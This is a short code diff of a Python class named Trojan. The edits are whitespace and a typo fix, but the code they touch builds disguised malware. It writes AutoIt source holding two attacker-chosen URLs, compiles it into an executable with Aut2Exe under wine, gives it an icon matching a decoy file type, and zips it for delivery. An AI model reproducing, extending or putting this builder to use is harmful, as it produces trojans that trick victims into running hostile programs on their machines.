@@ -4,7 +4,6 @@ import os
 import zipfile
 
 
-
 TROJAN_SOURCE_CODE_FILE = "trojan.txt"
 AUT2EXE = "/root/.wine/drive_c/Program Files (x86)/AutoIt3/Aut2Exe/Aut2exe.exe"
 
@@ -35,8 +34,7 @@ class Trojan:
 		file_type = url1.split(".")[-1].replace("#", "")
 		self.icon = self.set_icon(icon, file_type)
 		self.out_file = out_file
-		
-					
+
 	def create(self):
 		urls = 'Local $urls = "' +  self.url1 + "," +self.url2 + '"\n'
 		with open(TROJAN_SOURCE_CODE_FILE, "w") as trojan_file:
@@ -44,7 +42,7 @@ class Trojan:
 
 	def compile(self):
 		subprocess.call('wine "' + AUT2EXE + '" /In "' + TROJAN_SOURCE_CODE_FILE + '" /Out "' + self.out_file +'" /Icon "' + self.icon + '"' , shell=True)
-	
+
 	def set_icon(self, icon, file_type):
 		icons_directory = os.path.dirname(os.path.realpath(__file__)) + "/icons"
 		if icon == None:
@@ -52,11 +50,10 @@ class Trojan:
 
 		if not os.path.isfile(icon) :
 			print("[-] Can't find icon at " + icon)
-			print("[-] Using generaic icon.")
+			print("[-] Using generic icon.")
 			icon = icons_directory + "/generic.ico"
 		return icon
 
-	
 	def zip(self, file_to_zip):
 		os.chdir(os.path.dirname(file_to_zip))
 		trojan_name = file_to_zip.split("/")[-1]
